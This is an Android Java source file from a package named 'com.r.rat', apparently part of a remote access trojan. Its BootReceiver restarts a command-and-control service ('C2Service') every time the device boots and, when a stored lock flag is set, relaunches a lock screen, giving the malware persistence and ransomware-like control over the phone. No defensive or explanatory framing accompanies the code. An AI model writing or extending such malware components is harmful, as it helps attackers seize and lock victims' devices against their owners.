package com.r.rat;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
public class BootReceiver extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        Intent svc = new Intent(c, C2Service.class);
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(svc);
        else c.startService(svc);
        if (c.getSharedPreferences("lock", Context.MODE_PRIVATE).getBoolean("active", false))
            c.startActivity(new Intent(c, LockActivity.class)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP));
    }
}